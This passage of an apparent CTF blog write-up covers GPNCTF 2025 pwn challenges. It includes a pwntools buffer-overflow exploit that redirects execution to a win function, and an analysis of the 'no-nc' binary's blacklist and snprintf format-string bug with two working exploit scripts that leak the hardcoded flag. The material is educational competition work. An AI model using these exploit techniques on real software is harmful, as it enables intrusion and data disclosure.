</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span><span class=o>=</span><span class=s1>&#39;amd64&#39;</span><span class=p>,</span> <span class=n>os</span><span class=o>=</span><span class=s1>&#39;linux&#39;</span><span class=p>,</span> <span class=n>log_level</span><span class=o>=</span><span class=s1>&#39;debug&#39;</span><span class=p>,</span> <span class=n>terminal</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;tmux&#39;</span><span class=p>,</span> <span class=s1>&#39;splitw&#39;</span><span class=p>,</span> <span class=s1>&#39;-h&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>(</span><span class=n>argv</span><span class=o>=</span><span class=p>[],</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span> <span class=c1># GDB</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>([</span><span class=n>exe</span><span class=o>.</span><span class=n>path</span><span class=p>]</span> <span class=o>+</span> <span class=n>argv</span><span class=p>,</span> <span class=n>gdbscript</span><span class=o>=</span><span class=n>gdbscript</span><span class=p>,</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;ironview-of-constant-abundance.gpn23.ctf.kitctf.de&#34;</span><span class=p>,</span> <span class=s2>&#34;443&#34;</span><span class=p>,</span> <span class=n>ssl</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=n>gdbscript</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>disp/10i $rip
</span></span></span><span class=line><span class=cl><span class=s1>tb main
</span></span></span><span class=line><span class=cl><span class=s1>continue
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=o>**</span><span class=nb>locals</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>append</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;6. Quit</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Append something to your note&#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>offset</span><span class=p>,</span> <span class=n>length</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;6. Quit</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Give me an offset where you want to start editing: &#39;</span><span class=p>,</span> <span class=n>offset</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;How many bytes do you want to overwrite: &#39;</span><span class=p>,</span> <span class=n>length</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exit</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;6. Quit</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;6&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;0&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;1024&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mi>1024</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\xff</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>append</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x0</span><span class=p>)</span><span class=o>*</span><span class=mi>3</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mh>0x10</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>exe</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>win</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><p><img alt=Untitled loading=lazy src=/CTF/gpnctf25-11.png></p><blockquote><p>GPNCTF{NOw_y0U_5uRE1y_are_REaDY_to_Pwn_14DyBird!}</p></blockquote><h2 id=no-nc>no-nc<a hidden class=anchor aria-hidden=true href=#no-nc>#</a></h2><p><img alt=Untitled loading=lazy src=/CTF/gpnctf25-12.png></p><p><img alt=Untitled loading=lazy src=/CTF/gpnctf25-13.png></p><p>Only ASLR enabled this time.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define RAW_FLAG &#34;GPNCTF{fake_flag}&#34;
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=o>*</span><span class=n>FLAG</span> <span class=o>=</span> <span class=n>RAW_FLAG</span><span class=p>;</span>
</span></span></code></pre></div><p>First of all, the code defines a <strong>macro</strong> containing a <strong>hardcoded flag.</strong></p><p>Let’s breakdown the <strong>main function.</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>setbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>setbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>setbuf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>200</span><span class=p>]</span> <span class=o>=</span> <span class=p>{};</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Give me a file to read&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>read</span><span class=p>(</span><span class=n>STDIN_FILENO</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=p>(</span><span class=k>sizeof</span> <span class=n>buf</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>buf</span><span class=p>[</span><span class=k>sizeof</span> <span class=n>buf</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
</span></span></code></pre></div><p>The function starts by asking for a file name, which is then stored in the <code>buf</code> variable.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>str_len</span> <span class=o>=</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>size_t</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>str_len</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nf>no</span><span class=p>(</span><span class=n>buf</span><span class=p>[</span><span class=n>i</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;I don&#39;t like your character!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></div><p>The <code>no</code> function is called in a loop over every character in the <strong>user-provided input</strong> <code>buf</code> , and if any disallowed character is found, the program exits.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>no</span><span class=p>(</span><span class=kt>char</span> <span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>c</span> <span class=o>==</span> <span class=sc>&#39;.&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>c</span> <span class=o>==</span> <span class=sc>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>c</span> <span class=o>==</span> <span class=sc>&#39;n&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>c</span> <span class=o>==</span> <span class=sc>&#39;c&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><code>no</code> is a <strong>character blacklist</strong> to limit how the file name can be constructed, likely as a weak form of input sanitization.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>filename</span> <span class=o>=</span> <span class=nf>calloc</span><span class=p>(</span><span class=mi>200</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>snprintf</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=p>(</span><span class=k>sizeof</span> <span class=n>filename</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>,</span> <span class=n>buf</span><span class=p>);</span> <span class=c1>// format string vuln
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Will open:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=n>filename</span><span class=p>);</span>
</span></span></code></pre></div><p>A <strong>format string vulnerability</strong> is clearly present in the <code>snprintf</code> call, which uses the contents of <code>buf</code> directly as the format string when copying into <code>filename</code>. However, there is a limitation because the size argument passed to <code>snprintf</code> is incorrect as it returns the size of the pointer itself, not the allocated buffer, since <code>filename</code> is not dereferenced. This mistake restricts how much data <code>snprintf</code> can safely write.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>fd</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>perror</span><span class=p>(</span><span class=s>&#34;open&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>count</span> <span class=o>=</span> <span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>filebuf</span><span class=p>,</span> <span class=p>(</span><span class=k>sizeof</span> <span class=n>filebuf</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>count</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>write</span><span class=p>(</span><span class=n>STDOUT_FILENO</span><span class=p>,</span> <span class=n>filebuf</span><span class=p>,</span> <span class=n>count</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The function ends by opening the specified file and reading its content.</p><p>As is known in Linux <strong>EVERYHING</strong> is a file; regular files, executables, directories, and even devices are files, why not leak the content of the <strong>binnary itself</strong> to get the <strong>hardcoded flag.</strong></p><p><img alt=Untitled loading=lazy src=/CTF/gpnctf25-14.png></p><p><img alt=Untitled loading=lazy src=/CTF/gpnctf25-15.png></p><p>As expected, the <strong>blacklist</strong> targets characters that make up the <strong>binary’s name</strong>.</p><p><img alt=Untitled loading=lazy src=/CTF/gpnctf25-16.png></p><p>From here, I found two ways of <strong>bypassing the sanitization</strong>, both relying on the <strong>format string vulnerability.</strong></p><p>What is a <strong>format string vulnerability</strong>?</p><p>A <strong>format string vulnerability</strong> is a type of security bug that occurs when an attacker is able to control the format string argument of a function like <code>printf</code>, <code>sprintf</code>, <code>snprintf</code>, or similar formatting functions in C/C++. You can learn more about format string vulnerabilities <a href=https://owasp.org/www-community/attacks/Format_string_attack>here</a></p><h3 id=easy-way>EASY WAY<a hidden class=anchor aria-hidden=true href=#easy-way>#</a></h3><p>Since <strong>argv[0]</strong> is a pointer to the <strong>executable name</strong> and the stack always has a reference to that pointer we could abuse the <strong>format string specifiers</strong> to bypass the sanitizer with <strong>$s.</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>exe</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./nc&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span><span class=o>=</span><span class=s1>&#39;amd64&#39;</span><span class=p>,</span> <span class=n>os</span><span class=o>=</span><span class=s1>&#39;linux&#39;</span><span class=p>,</span> <span class=n>log_level</span><span class=o>=</span><span class=s1>&#39;debug&#39;</span><span class=p>,</span> <span class=n>terminal</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;tmux&#39;</span><span class=p>,</span> <span class=s1>&#39;splitw&#39;</span><span class=p>,</span> <span class=s1>&#39;-h&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>(</span><span class=n>argv</span><span class=o>=</span><span class=p>[],</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span> <span class=c1># GDB</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>([</span><span class=n>exe</span><span class=o>.</span><span class=n>path</span><span class=p>]</span> <span class=o>+</span> <span class=n>argv</span><span class=p>,</span> <span class=n>gdbscript</span><span class=o>=</span><span class=n>gdbscript</span><span class=p>,</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;mounttown-of-uncomfortably-powerful-unity.gpn23.ctf.kitctf.de&#34;</span><span class=p>,</span> <span class=s2>&#34;443&#34;</span><span class=p>,</span> <span class=n>ssl</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=n>gdbscript</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>disp/10i $rip
</span></span></span><span class=line><span class=cl><span class=s1>tb main
</span></span></span><span class=line><span class=cl><span class=s1>continue
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=o>**</span><span class=nb>locals</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;Give me a file to read</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;%129$s</span><span class=se>\0</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>leaks</span> <span class=o>=</span> <span class=nb>set</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>clean</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>leak</span> <span class=ow>in</span> <span class=n>leaks</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;GPN&#39;</span> <span class=ow>in</span> <span class=n>leak</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;Leak: </span><span class=si>{</span><span class=n>leak</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><h3 id=hard-way>HARD WAY<a hidden class=anchor aria-hidden=true href=#hard-way>#</a></h3><p>As we have control of the format and the binary <strong>only</strong> <strong>sanitize</strong> characters before <strong>first null byte</strong>, we could try to construct the filename <strong>character by characte</strong>r abusing <strong>$C.</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>exe</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./nc&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span><span class=o>=</span><span class=s1>&#39;amd64&#39;</span><span class=p>,</span> <span class=n>os</span><span class=o>=</span><span class=s1>&#39;linux&#39;</span><span class=p>,</span> <span class=n>log_level</span><span class=o>=</span><span class=s1>&#39;debug&#39;</span><span class=p>,</span> <span class=n>terminal</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;tmux&#39;</span><span class=p>,</span> <span class=s1>&#39;splitw&#39;</span><span class=p>,</span> <span class=s1>&#39;-h&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>(</span><span class=n>argv</span><span class=o>=</span><span class=p>[],</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span> <span class=c1># GDB</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>([</span><span class=n>exe</span><span class=o>.</span><span class=n>path</span><span class=p>]</span> <span class=o>+</span> <span class=n>argv</span><span class=p>,</span> <span class=n>gdbscript</span><span class=o>=</span><span class=n>gdbscript</span><span class=p>,</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>([</span><span class=n>exe</span><span class=o>.</span><span class=n>path</span><span class=p>]</span> <span class=o>+</span> <span class=n>argv</span><span class=p>,</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=n>gdbscript</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>disp/10i $rip
</span></span></span><span class=line><span class=cl><span class=s1>tb main
</span></span></span><span class=line><span class=cl><span class=s1>continue
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=o>**</span><span class=nb>locals</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;Give me a file to read</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;%11$C%12$C</span><span class=se>\0\0\0\0\0\0\0\0</span><span class=s2>n</span><span class=se>\0\0\0\0\0\0\0</span><span class=s2>c</span><span class=se>\0\0\0\0\0\0\0</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>leaks</span> <span class=o>=</span> <span class=nb>set</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>clean</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>leak</span> <span class=ow>in</span> <span class=n>leaks</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;GPN&#39;</span> <span class=ow>in</span> <span class=n>leak</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;Leak: </span><span class=si>{</span><span class=n>leak</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><p><img alt=Untitled loading=lazy src=/CTF/gpnctf25-17.png></p><p><img alt=Untitled loading=lazy src=/CTF/gpnctf25-18.png></p><blockquote><p>GPNCTF{uP_AND_dowN_4Ll_4round_6oEs_7H3_N_dImEn51onAl_c1rClE_WTf_IS_Thi5_F14G}</p></blockquote></div><footer class=post-footer><ul class=post-tags><li><a href=https://pwndside.github.io/tags/pwn/>Pwn</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://pwndside.github.io/>PwndSide</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>